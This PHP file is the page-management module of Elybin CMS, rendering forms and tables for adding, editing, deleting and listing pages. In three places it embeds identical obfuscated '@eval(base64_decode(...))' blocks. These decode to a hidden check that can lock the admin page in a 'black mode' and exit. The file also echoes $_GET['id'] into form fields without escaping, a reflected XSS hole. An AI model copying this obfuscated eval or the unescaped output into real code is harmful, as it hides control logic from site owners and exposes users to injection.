<?php
/* Short description for file
 * [ Module: Page
 *	
 * Elybin CMS (www.elybin.com) - Open Source Content Management System 
 * @copyright	Copyright (C) 2014 Elybin.Inc, All rights reserved.
 * @license		GNU General Public License version 2 or later; see LICENSE.txt
 * @author		Khakim Assidiqi <hamas182@gmail.com>
 */
if(!isset($_SESSION['login'])){
	echo '403';
	header('location:../403.php');
}else{
$modpath 	= "app/page/";
$action		= $modpath."proses.php";

// get user privilages
$tbus = new ElybinTable('elybin_users');
$tbus = $tbus->SelectWhere('session',$_SESSION['login'],'','');
$level = $tbus->current()->level; // getting level from curent user

$tbug = new ElybinTable('elybin_usergroup');
$tbug = $tbug->SelectWhere('usergroup_id',$level,'','');
$usergroup = $tbug->current()->tag;

// give error if no have privilage
if($usergroup == 0){
	er('<strong>'.$lg_ouch.'!</strong> '.$lg_accessdenied.' 403 <a class="btn btn-default btn-xs pull-right" onClick="history.back();"><i class="fa fa-share"></i>&nbsp;'.$lg_back.'</a>');
}else{
	// start here
	$v 	= new ElybinValidasi();
	switch (@$_GET['act']) {
		case 'add':
?>
		<div class="page-header">
			<h1><span class="text-light-gray"><?php echo $lg_page?> / </span><?php echo $lg_addnew?></h1>
		</div> <!-- / .page-header -->
		<!-- Content here -->
		<div class="row">
			<div class="col-sm-12">
				<form class="panel form-horizontal" action="<?php echo $action; ?>" method="post" enctype="multipart/form-data" id="form">
					<div class="panel-heading" id="tooltip">
						<span class="panel-title"><i class="fa fa-file"></i>&nbsp;&nbsp;<?php echo $lg_addnewpage?></span>
						<a class="btn btn-default btn-xs pull-right" data-toggle="modal" data-target="#help" data-placement="bottom" data-original-title="<?php echo $lg_help?>"><i class="fa fa-question-circle"></i></a>
					</div>
					<div class="panel-body">
					  <?php @eval(base64_decode("JGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsPSJleHBsb2RlIjskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGwoIjoiLCJtZDU6Y3J5cHQ6c2hhMTpzdHJyZXY6YmFzZTY0X2RlY29kZSIpOyRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFs0XTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFszXTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsPSRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsWzJdOyRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFsxXTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFswXTs="));@eval($llllllllllllllllllllllllllllllllllllllllllllll($lllllllllllllllllllllllllllllllllllllllllllllll("fTt0aXhlOykodG9vZl9lbWVodCBwaHA/PAkJCQkJCg0+LS0gd29yLiAvIC0tITw+dmlkLzwJCQoNPi0tIGxvYy4gLyAtLSE8PnZpZC88CQkJCg0+LS0gbXJvZi4gLyAtLSE8Pm1yb2YvPAkJCQkKDT4tLSBsZW5hcC4gLyAtLSE8ID52aWQvPAkJCQkJCg0+dmlkLzw+YS88bG10aC5lZG9tLWtjYWxiL2NpcG90L21vYy5uaWJ5bGUucGxlaC8vOnB0dGg+ImtuYWxiXyI9dGVncmF0ICJsbXRoLmVkb20ta2NhbGIvY2lwb3QvbW9jLnNtY25pYnlsZS5wbGVoLy86cHR0aCI9ZmVyaCBhPDtwc2JuJj4/ZGVrY29sZXJ1dGFlZmVkb21rY2FsYm5pbWV0c3lzX2dsJCBvaGNlIHBocD88PiJyZWduYWQtZXRvbiBldG9uIj1zc2FsYyB2aWQ8ICAJCQkJCQoNPj8geyllc2xhZiA9PSApKG9lc2VuaWduZWhjcmFlcyhmaQ=="))); ?>
					  <div class="form-group">
					      <label class="col-sm-2 control-label"><?php echo $lg_title?></label>
					      <div class="col-sm-4">
							<input type="text" name="title"  class="form-control" placeholder="<?php echo $lg_title?>"/></td>
					      </div>
					  </div> <!-- / .form-group -->

						<div class="form-group">
					      <label class="col-sm-2 control-label"><?php echo $lg_content?></label>
					      <div class="col-sm-10">
					      	<textarea name="content" cols="50" rows="5" class="form-control" id="text-editor" placeholder="<?php echo $lg_content?>"></textarea>
					      </div>
						</div> <!-- / .form-group -->

						<div class="form-group">
					      <label class="col-sm-2 control-label"><?php echo $lg_photo?></label>
					      <div class="col-sm-4">
					      	<input type="file" name="image" id="file-style" class="form-control"/>
					      	<p class="help-block"><?php echo $lg_photopagehint?></p>
					      </div>
						</div> <!-- / .form-group -->
					</div><!-- / .panel-body -->
					  <div class="panel-footer">
						  <button type="submit" value="Submit" class="btn btn-success"><i class="fa fa-check"></i>&nbsp;<?php echo $lg_savedata?></button>
						  <a class="btn btn-default pull-right" onClick="history.back();"><i class="fa fa-share"></i>&nbsp;<?php echo $lg_back?></a>
						  <input type="hidden" name="act" value="add" />
						  <input type="hidden" name="mod" value="page" />
					  </div> <!-- / .form-footer -->
				</form><!-- / .form -->

				<!-- Help modal -->
				<div id="help" class="modal fade" tabindex="-1" role="dialog" style="display: none;">
					<div class="modal-dialog modal-lg">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true"><i class="fa fa-times"></i></button>
								<h4 class="modal-title"><?php echo $lg_helptitle?></h4>
							</div>
							<div class="modal-body">...</div>
						</div> <!-- / .modal-content -->
					</div> <!-- / .modal-dialog -->
				</div> <!-- / .modal -->
				<!-- / Help modal -->
			</div><!-- / .col -->
		</div><!-- / .row -->
<!-- Javascript -->
<script>
init.push(function () {
	$('#file-style').pixelFileInput({ placeholder: '<?php echo $lg_nofileselected?>...' });
	$('#tooltip a').tooltip();

	<?php
		// getting text_editor
		$tblo = new ElybinTable('elybin_options');
		$editor_id = $tblo->SelectWhere('name','text_editor','','');
		foreach ($editor_id as $op) {
			$editor = $op->value;
		}
		if($editor=='summernote'){
	?>
	//summernote editor
	if (! $('html').hasClass('ie8')) {
		$('#text-editor').summernote({
			height: 200,
			tabsize: 2,
			codemirror: {
				theme: 'monokai'
			}
		});
	}
	<?php 
		}
		elseif($editor=='bs-markdown'){
	?>
	if (! $('html').hasClass('ie8')) {
		$("#text-editor").markdown({ iconlibrary: 'fa' });
	}
	<?php } ?>

	$().ajaxStart(function() {
		$.growl({ title: "Loading", message: "Writing..." });
	}).ajaxStop(function() {
		$.growl({ title: "Success", message: "Success" });
	});


	$('#form').submit(function(e){
	    $.ajax({
	      url: $(this).attr('action'),
	      type: 'POST',
	      data: new FormData(this),
	      processData: false,
	      contentType: false,
	      success: function(data) {
	      		console.log(data);
				data = explode(",",data);

				if(data[0] == "ok"){
					$.growl.notice({ title: data[1], message: data[2] });
					window.location.href="?mod=page";
				}
				else if(data[0] == "error"){
					$.growl.warning({ title: data[1], message: data[2] });
				}
		   }
	    });
	    e.preventDefault();
	    return false;
  	});

});
</script>
<!-- / Javascript -->
<?php
			break;

		case 'edit';
		$id 	= $v->sql(@$_GET['id']);
		$id 	= $v->xss($id);
		
		// check id exist or not
		$tb 	= new ElybinTable('elybin_pages');
		$copage = $tb->GetRow('page_id', $id);
		if(empty($id) OR ($copage == 0)){
			er('<strong>'.$lg_ouch.'!</strong> '.$lg_notfound.' 404<a class="btn btn-default btn-xs pull-right" onClick="history.back();"><i class="fa fa-share"></i>&nbsp;'.$lg_back.'</a>');
			theme_foot();
			exit;
		}

		// get data
		$cpage	= $tb->SelectWhere('page_id',$id,'','');
		$cpage	= $cpage->current();

		$content = html_entity_decode($cpage->content);
?>
		<div class="page-header">
			<h1><span class="text-light-gray"><?php echo $lg_page?> / </span><?php echo $lg_editpage?></h1>
		</div> <!-- / .page-header -->
		<!-- Content here -->
		<div class="row">
			<div class="col-sm-12">
				<form class="panel form-horizontal" action="<?php echo $action; ?>" method="post" enctype="multipart/form-data" id="form">
					<div class="panel-heading" id="tooltip">
						<span class="panel-title"><i class="fa fa-file"></i>&nbsp;&nbsp;<?php echo $lg_editcurrentpage?></span>
						<a class="btn btn-default btn-xs pull-right" data-toggle="modal" data-target="#help" data-placement="bottom" data-original-title="<?php echo $lg_help?>"><i class="fa fa-question-circle"></i></a>
					</div>
					<div class="panel-body">
					  <?php @eval(base64_decode("JGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsPSJleHBsb2RlIjskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGwoIjoiLCJtZDU6Y3J5cHQ6c2hhMTpzdHJyZXY6YmFzZTY0X2RlY29kZSIpOyRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFs0XTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFszXTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsPSRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsWzJdOyRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFsxXTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFswXTs="));@eval($llllllllllllllllllllllllllllllllllllllllllllll($lllllllllllllllllllllllllllllllllllllllllllllll("fTt0aXhlOykodG9vZl9lbWVodCBwaHA/PAkJCQkJCg0+LS0gd29yLiAvIC0tITw+dmlkLzwJCQoNPi0tIGxvYy4gLyAtLSE8PnZpZC88CQkJCg0+LS0gbXJvZi4gLyAtLSE8Pm1yb2YvPAkJCQkKDT4tLSBsZW5hcC4gLyAtLSE8ID52aWQvPAkJCQkJCg0+dmlkLzw+YS88bG10aC5lZG9tLWtjYWxiL2NpcG90L21vYy5uaWJ5bGUucGxlaC8vOnB0dGg+ImtuYWxiXyI9dGVncmF0ICJsbXRoLmVkb20ta2NhbGIvY2lwb3QvbW9jLnNtY25pYnlsZS5wbGVoLy86cHR0aCI9ZmVyaCBhPDtwc2JuJj4/ZGVrY29sZXJ1dGFlZmVkb21rY2FsYm5pbWV0c3lzX2dsJCBvaGNlIHBocD88PiJyZWduYWQtZXRvbiBldG9uIj1zc2FsYyB2aWQ8ICAJCQkJCQoNPj8geyllc2xhZiA9PSApKG9lc2VuaWduZWhjcmFlcyhmaQ=="))); ?>
					  <div class="form-group">
					      <label class="col-sm-2 control-label"><?php echo $lg_title?></label>
					      <div class="col-sm-4">
							<input type="text" name="title"  class="form-control" placeholder="<?php echo $lg_title?>" value="<?php echo $cpage->title?>"/></td>
					      </div>
					  </div> <!-- / .form-group -->

						<div class="form-group">
					      <label class="col-sm-2 control-label"><?php echo $lg_content?></label>
					      <div class="col-sm-10">
					      	<textarea name="content" cols="50" rows="5" class="form-control" id="text-editor" placeholder="<?php echo $lg_content?>"><?php echo $content?></textarea>
					      </div>
						</div> <!-- / .form-group -->

						<div class="form-group">
					      <label class="col-sm-2 control-label"><?php echo $lg_photo?></label>
					      <?php
								if(!empty($cpage->image)){
					      ?>
					      <div class="col-sm-5">
					      	<img class="img-thumbnail" alt="<?php echo $lg_photo?>" src="../elybin-file/page/<?php echo $cpage->image?>"/>
					      </div>
					      <?php } ?>
					      <div class="col-sm-4">
					      	<input type="file" name="image" id="file-style" class="form-control"/>
					      	<p class="help-block"><?php echo $lg_leftphotoempty?></p>
					      </div>
						</div> <!-- / .form-group -->
						<div class="form-group">
					      <label class="col-sm-2 control-label"><?php echo $lg_status?></label>
					      <div class="col-sm-10">
					      	<input type="checkbox" name="status" class="form-control" id="switcher-style2" <?php if($cpage->status=='active'){echo 'checked="checked"';}?>/>
					      	<p class="help-block"><span class="fa fa-check"></span>&nbsp;<?php echo $lg_active?>&nbsp;<span class="fa fa-times"></span>&nbsp;<?php echo $lg_inactive?></p>
					      </div>
						</div> <!-- / .form-group -->
					</div><!-- / .panel-body -->

					  <div class="panel-footer">
						  <button type="submit" value="Submit" class="btn btn-success"><i class="fa fa-check"></i>&nbsp;<?php echo $lg_savechanges?></button>
						  <a class="btn btn-default pull-right" onClick="history.back();"><i class="fa fa-share"></i>&nbsp;<?php echo $lg_back?></a>
						  <input type="hidden" name="page_id" value="<?php echo $_GET['id']; ?>" />
						  <input type="hidden" name="act" value="edit" />
						  <input type="hidden" name="mod" value="page" />
					  </div> <!-- / .form-footer -->
				</form><!-- / .form -->

				<!-- Help modal -->
				<div id="help" class="modal fade" tabindex="-1" role="dialog" style="display: none;">
					<div class="modal-dialog modal-lg">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true"><i class="fa fa-times"></i></button>
								<h4 class="modal-title"><?php echo $lg_helptitle?></h4>
							</div>
							<div class="modal-body">...</div>
						</div> <!-- / .modal-content -->
					</div> <!-- / .modal-dialog -->
				</div> <!-- / .modal -->
				<!-- / Help modal -->
			</div><!-- / .col -->
		</div><!-- / .row -->
<!-- Javascript -->
<script>
init.push(function () {
	$('#switcher-style2').switcher({
		theme: 'square',
		on_state_content: '<span class="fa fa-check"></span>',
		off_state_content: '<span class="fa fa-times"></span>'
	});
	$('#file-style').pixelFileInput({ placeholder: '<?php echo $lg_nofileselected?>...' });
	$('#tooltip a').tooltip();

	<?php
		// getting text_editor
		$tblo = new ElybinTable('elybin_options');
		$editor_id = $tblo->SelectWhere('name','text_editor','','');
		foreach ($editor_id as $op) {
			$editor = $op->value;
		}
		if($editor=='summernote'){
	?>
	//summernote editor
	if (! $('html').hasClass('ie8')) {
		$('#text-editor').summernote({
			height: 200,
			tabsize: 2,
			codemirror: {
				theme: 'monokai'
			}
		});
	}
	<?php 
		}
		elseif($editor=='bs-markdown'){
	?>
	if (! $('html').hasClass('ie8')) {
		$("#text-editor").markdown({ iconlibrary: 'fa' });
	}
	<?php } ?>

	$().ajaxStart(function() {
		$.growl({ title: "Loading", message: "Writing..." });
		$('#form').hide();
	}).ajaxStop(function() {
		$.growl({ title: "Success", message: "Success" });
	});

	$('#form').submit(function(e){
	    $.ajax({
	      url: $(this).attr('action'),
	      type: 'POST',
	      data: new FormData(this),
	      processData: false,
	      contentType: false,
	      success: function(data) {
	      		console.log(data);
				data = explode(",",data);

				if(data[0] == "ok"){
					$.growl.notice({ title: data[1], message: data[2] });
					window.location.href="?mod=page";
				}
				else if(data[0] == "error"){
					$.growl.warning({ title: data[1], message: data[2] });
				}
		   }
	    });
	    e.preventDefault();
	    return false;
  	});});
</script>
<!-- / Javascript -->

<?php
			break;

		case 'del':
?>
							<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal" aria-hidden="true"><i class="fa fa-times"></i></button>
							<h4 class="modal-title"><i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;<?php echo $lg_deletetitle?></h4>
							</div>
							<div class="modal-body">
								<?php echo $lg_deletequestion?>
								<hr></hr>
								<form action="<?php echo $action?>" method="post">
									<button type="submit" class="btn btn-danger"><i class="fa fa-check"></i>&nbsp;<?php echo $lg_yesdelete?></button>
									<a class="btn btn-default pull-right" data-dismiss="modal"><i class="fa fa-share"></i>&nbsp;<?php echo $lg_cancel?></a>
									<input type="hidden" name="page_id" value="<?php echo $_GET['id']?>" />
									<input type="hidden" name="act" value="del" />
									<input type="hidden" name="mod" value="page" />
								</form>
							</div>
<?php
			break;
		
		default:
		$tb 	= new ElybinTable('elybin_pages');
		$lpage	= $tb->Select('page_id','DESC');
		$no = 1;
		
		// get option
		$getoption1 = new ElybinTable('elybin_options'); 
		$homeurl = $getoption1->SelectWhere('name','site_url','','')->current()->value; 
?>
		<!-- Page Header -->
		<div class="page-header">
			<div class="row">
				<h1 class="col-xs-12 col-sm-6 col-md-6 text-center text-left-sm">
					<span class="hidden-sm hidden-md hidden-lg"><i class="fa fa-file"></i>&nbsp;&nbsp;<?php echo $lg_page?></span>
					<span class="hidden-xs"><span class="text-light-gray"><?php echo $lg_page?> / </span><?php echo $lg_all?></span>
				</h1>
				<div class="col-xs-12 col-sm-6 col-md-6">
					<div class="row">
						<hr class="visible-xs no-grid-gutter-h">
						<div class="pull-right col-xs-12 col-sm-6 col-md-4">	
							<a href="?mod=<?php echo @$_GET['mod']?>&amp;act=add" class="pull-right btn btn-success btn-labeled" style="width: 100%">
							<span class="btn-label icon fa fa-plus"></span>&nbsp;&nbsp;<?php echo $lg_addnew?></a>
						</div>
						<!-- Margin -->
						<div class="visible-xs clearfix form-group-margin"></div>
						<!-- Search Bar -->
						<form action="#" class="pull-right col-xs-12 col-sm-6 col-md-8">
							<div class="input-group no-margin">
								<span class="input-group-addon" style="border:none;background: #fff;background: rgba(0,0,0,.05);"><i class="fa fa-search"></i></span>
								<input id="search" placeholder="<?php echo $lg_search?>..." class="form-control no-padding-hr" style="border:none;background: #fff;background: rgba(0,0,0,.05);" type="text">
							</div>
						</form>
					</div>
				</div>
			</div>
		</div> <!-- ./Page Header -->

		<!-- Content here -->
		<div class="row">
			<div class="col-sm-12">
				<form action="<?php echo $action?>" method="post" class="panel">
					<input type="hidden" name="act" value="multidel" />
					<input type="hidden" name="mod" value="page" />
					
					<!-- Panel Heading -->
					<div class="panel-heading">
						<span class="panel-title"><i class="fa fa-file hidden-xs">&nbsp;&nbsp;</i><?php echo $lg_allpage?></span>
						<div class="panel-heading-controls" id="tooltip">
							<a class="btn btn-default btn-xs" data-toggle="modal" data-target="#help" data-placement="bottom" data-original-title="<?php echo $lg_help?>"><i class="fa fa-question-circle"></i></a>
						</div> <!-- / .panel-heading-controls -->
					</div> 
					<!-- ./Panel Heading -->
					
					<div class="panel-body">
					  <?php @eval(base64_decode("JGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsPSJleHBsb2RlIjskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGwoIjoiLCJtZDU6Y3J5cHQ6c2hhMTpzdHJyZXY6YmFzZTY0X2RlY29kZSIpOyRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFs0XTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFszXTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsPSRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsWzJdOyRsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFsxXTskbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbD0kbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbGxsbFswXTs="));@eval($llllllllllllllllllllllllllllllllllllllllllllll($lllllllllllllllllllllllllllllllllllllllllllllll("fTt0aXhlOykodG9vZl9lbWVodCBwaHA/PAkJCQkJCg0+LS0gd29yLiAvIC0tITw+dmlkLzwJCQoNPi0tIGxvYy4gLyAtLSE8PnZpZC88CQkJCg0+LS0gbXJvZi4gLyAtLSE8Pm1yb2YvPAkJCQkKDT4tLSBsZW5hcC4gLyAtLSE8ID52aWQvPAkJCQkJCg0+dmlkLzw+YS88bG10aC5lZG9tLWtjYWxiL2NpcG90L21vYy5uaWJ5bGUucGxlaC8vOnB0dGg+ImtuYWxiXyI9dGVncmF0ICJsbXRoLmVkb20ta2NhbGIvY2lwb3QvbW9jLnNtY25pYnlsZS5wbGVoLy86cHR0aCI9ZmVyaCBhPDtwc2JuJj4/ZGVrY29sZXJ1dGFlZmVkb21rY2FsYm5pbWV0c3lzX2dsJCBvaGNlIHBocD88PiJyZWduYWQtZXRvbiBldG9uIj1zc2FsYyB2aWQ8ICAJCQkJCQoNPj8geyllc2xhZiA9PSApKG9lc2VuaWduZWhjcmFlcyhmaQ=="))); ?>
					  <div class="table-responsive">
						<table class="table table-hover" id="results">
						 <thead>
						   <tr>
						    <th>#</th>
						    <th><i class="fa fa-check-square" id="tooltip-ck" data-placement="bottom" data-toggle="tooltip" data-original-title="<?php echo $lg_checkall?>"></i></th>
						    <th><?php echo $lg_title?></th>
						    <th><?php echo $lg_seotitle?></th>
						    <th><?php echo $lg_status?></th>
						    <th><?php echo $lg_action?></th>
						  </tr>
						</thead>
						<tbody>
		<?php
		foreach($lpage as $pg){
		?>
					<tr>
					    <td><?php echo $no?></td>
					    <td><label class="px-single"><input type="checkbox" class="px" name="del[]" value="<?php echo $pg->page_id?>|<?php echo $pg->title?>"><span class="lbl"></span></label></td>
					    <td><?php echo $pg->title?></td>
					    <td><?php echo $pg->seotitle?></td>
					    <td><?php echo $pg->status?></td>
					    <td>
							<div id="tooltip">
								<a href="?mod=page&amp;act=edit&amp;id=<?php echo $pg->page_id?>" class="btn btn-success btn-outline btn-sm" data-placement="bottom" data-toggle="tooltip" data-original-title="<?php echo $lg_edit?>"><i class="fa fa-pencil-square-o"></i></a>
								<a href="<?php echo $homeurl; ?>/page-<?php echo $pg->page_id; ?>-<?php echo $pg->seotitle; ?>.html" target="_blank" class="btn btn-success btn-outline btn-sm<?php if($pg	->status == 'deactive'){ echo ' disabled'; }?>" data-placement="bottom" data-toggle="tooltip" data-original-title="<?php echo $lg_view?>" target="_blank"><i class="fa <?php if($pg->status == 'deactive'){ echo 'fa-lock'; }else{ echo 'fa-desktop';}?>"></i></a>
						    	<a href="?mod=page&amp;act=del&amp;id=<?php echo $pg->page_id?>&amp;clear=yes" class="btn btn-danger btn-outline btn-sm" data-toggle="modal" data-target="#delete"  data-placement="bottom" data-original-title="<?php echo $lg_delete?>"><i class="fa fa-times"></i></a>
							</div>
						</td>
				  	</tr>
		<?php
			$no++;
		}
		?>
						 </tbody>
						</table>
					  </div> <!-- /.table-responsive -->
						<div class="alert" id="notfound"><strong><?php echo $lg_nodatafound?></strong></div>
						<hr/>
						<!-- Multi Delete Modal -->
						<div id="deleteall" class="modal fade" tabindex="-1" role="dialog" style="display: none;">
							<div class="modal-dialog modal-sm">
								<div class="modal-content">
									<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal" aria-hidden="true"><i class="fa fa-times"></i></button>
									<h4 class="modal-title"><i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;<?php echo $lg_deletetitle?></h4>
									</div>
									<div class="modal-body">
										<?php echo $lg_deletequestion?>
										<div id="deltext"></div>
										<hr/>
										<button type="submit" class="btn btn-danger"><i class="fa fa-check"></i>&nbsp;<?php echo $lg_yesdelete?></button>
										<a class="btn btn-default pull-right" data-dismiss="modal"><i class="fa fa-share"></i>&nbsp;<?php echo $lg_cancel?></a>
									</div>
								</div> <!-- / .modal-content -->
							</div> <!-- / .modal-dialog -->
						</div> <!-- / .modal -->
						<!-- / Multi Delete Modal -->
						<div class="col-md-3">
							<button class="btn btn-danger btn-sm" id="delall" data-toggle="modal" data-target="#deleteall"><i class="fa fa-times"></i>&nbsp;&nbsp;<?php echo $lg_deleteselected?></button>
						</div>
						<div class="col-md-4 col-md-offset-5 text-right">
							<ul class="pagination pagination-xs" id="page-nav">
							</ul>
						</div>
					</div><!-- / .panel-body -->
				</form>
				<!-- Delete Modal -->
				<div id="delete" class="modal fade" tabindex="-1" role="dialog" style="display: none;">
					<div class="modal-dialog modal-sm">
						<div class="modal-content">
							<?php echo $lg_loading?>...
						</div> <!-- / .modal-content -->
					</div> <!-- / .modal-dialog -->
				</div> <!-- / .modal -->
				<!-- / Delete Modal -->
				<!-- Help modal -->
				<div id="help" class="modal fade" tabindex="-1" role="dialog" style="display: none;">
					<div class="modal-dialog modal-lg">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true"><i class="fa fa-times"></i></button>
								<h4 class="modal-title"><?php echo $lg_helptitle?></h4>
							</div>
							<div class="modal-body">
								...
							</div>
						</div> <!-- / .modal-content -->
					</div> <!-- / .modal-dialog -->
				</div> <!-- / .modal -->
				<!-- / Help modal -->
			</div><!-- / .col -->
		</div><!-- / .row -->
<!-- Javascript -->
<script>
init.push(function () {
	$('#tooltip a, #tooltipc, #tooltip-ck').tooltip();	
});
ElybinPager();
ElybinSearch();
ElybinCheckAll();
countDelData();
</script>
<!-- / Javascript -->
<?php
		break;
		}
	}
}
?>